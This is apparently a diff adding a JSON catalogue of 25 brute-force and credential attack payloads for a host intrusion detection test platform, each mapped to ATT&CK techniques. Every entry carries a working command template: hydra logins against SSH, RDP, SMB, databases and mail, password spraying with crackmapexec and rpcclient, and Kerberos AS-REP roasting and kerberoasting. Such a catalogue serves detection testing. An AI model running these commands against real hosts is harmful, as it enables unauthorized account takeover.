@@ -1,0 +1,962 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: ssh hydra top-100",
+    "payload_external_id": "HIDS-BRUTEFORCE-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra ssh 模块跑 top-100 弱口令。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P top100.txt ssh://{{TARGET_HOST}}",
+    "hids_artifact_path": "users.txt",
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:22"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: rdp hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra rdp 模块爆破 Windows 远程桌面。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt rdp://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:3389"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: smb hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra smb 模块爆破 Windows 共享。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt smb://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:445"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: smb crackmapexec",
+    "payload_external_id": "HIDS-BRUTEFORCE-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "CrackMapExec smb spray（按 domain 批量喷洒）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "crackmapexec smb {{TARGET_CIDR}} -u admin -p 'Spring2026!'",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:crackmapexec"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: mysql hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra mysql 模块爆破。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt mysql://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:3306"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: postgres hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra postgres 模块爆破。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt postgres://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:5432"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: mssql hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra mssql 模块爆破 SA。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -l sa -P pass.txt mssql://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:1433"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: oracle brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "patator ora_login 爆破 Oracle SID + 密码。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "patator ora_login host={{TARGET_HOST}} user=SYS password=FILE0 0=pass.txt",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:patator"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: ldap hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra ldap 模块爆破 AD 域控。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt ldap2://{{TARGET_HOST}}/{{BASE_DN}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:389"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: vnc hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra vnc 模块爆破 RealVNC/TightVNC。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -P pass.txt vnc://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:5900"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: ftp hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra ftp 模块爆破。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt ftp://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:21"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: telnet hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra telnet 模块爆破老网设。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt telnet://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:23"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: snmp hydra",
+    "payload_external_id": "HIDS-BRUTEFORCE-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra snmp 模块爆破社区字符串。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -P snmp-community.txt snmp://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "udp_outbound:{{TARGET_HOST}}:161"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: kerberos ASREP",
+    "payload_external_id": "HIDS-BRUTEFORCE-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "GetNPUsers 提取无 preauth 用户的 AS-REP 哈希后离线爆。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1558.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "GetNPUsers.py {{DOMAIN}}/ -no-pass -usersfile users.txt",
+    "hids_artifact_path": "users.txt",
+    "hids_expected_artifacts": [
+      "proc:python3",
+      "tcp_outbound:{{TARGET_HOST}}:88"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: kerberoast",
+    "payload_external_id": "HIDS-BRUTEFORCE-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "GetUserSPNs 提取 SPN 用户 TGS 票据后 hashcat 爆破。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1558.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "GetUserSPNs.py {{DOMAIN}}/{{USER}} -outputfile spn.txt",
+    "hids_artifact_path": "spn.txt",
+    "hids_expected_artifacts": [
+      "proc:python3",
+      "tcp_outbound:{{TARGET_HOST}}:88"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: smb password spray",
+    "payload_external_id": "HIDS-BRUTEFORCE-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "1 个密码喷洒所有域用户（避免账户锁定）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "crackmapexec smb {{TARGET_HOST}} -u users.txt -p 'Spring2026!' --no-bruteforce",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:crackmapexec"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: rpc samba spray",
+    "payload_external_id": "HIDS-BRUTEFORCE-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "rpcclient 通过 LSARPC 喷洒。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "for u in $(cat users.txt); do rpcclient -U \"$u%Spring2026!\" {{TARGET_HOST}} -c 'getusername'; done",
+    "hids_artifact_path": "users.txt",
+    "hids_expected_artifacts": [
+      "proc:rpcclient"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: mongodb brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "ncrack mongo 模块爆破 mongoshell auth。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "ncrack -p 27017 -U users.txt -P pass.txt {{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:ncrack",
+      "tcp_outbound:{{TARGET_HOST}}:27017"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: redis brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "redis-cli + python 脚本爆破密码。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "python3 redis-brute.py {{TARGET_HOST}} 6379 pass.txt",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:python3",
+      "tcp_outbound:{{TARGET_HOST}}:6379"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: rsync brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "rsync 模块密码爆破。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "python3 rsync-brute.py {{TARGET_HOST}} module users.txt pass.txt",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:python3",
+      "tcp_outbound:{{TARGET_HOST}}:873"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: smtp brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra smtp 模块爆破 PLAIN/LOGIN。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -l admin -P pass.txt smtp://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:25"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: imap brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra imap 模块爆破。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt imap://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:143"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: pop3 brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Hydra pop3 模块爆破。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "hydra -L users.txt -P pass.txt pop3://{{TARGET_HOST}}",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:hydra",
+      "tcp_outbound:{{TARGET_HOST}}:110"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: winrm brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "evil-winrm 爆破 WinRM。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1021.006"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "executable",
+    "hids_command_template": "evil-winrm -i {{TARGET_HOST}} -u admin -p pass.txt",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:evil-winrm"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Brute Force: kubelet api brute",
+    "payload_external_id": "HIDS-BRUTEFORCE-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "kubelet/k8s api 弱凭证爆破（云原生）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1110.001"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "brute_force"
+    ],
+    "hids_category": "brute_force",
+    "hids_execution_mode": "command",
+    "hids_command_template": "for u in $(cat users.txt); do kubectl --token=$(curl -s http://{{TARGET_HOST}}:10250/...) cluster-info; done",
+    "hids_artifact_path": null,
+    "hids_expected_artifacts": [
+      "proc:kubectl"
+    ]
+  }
+]
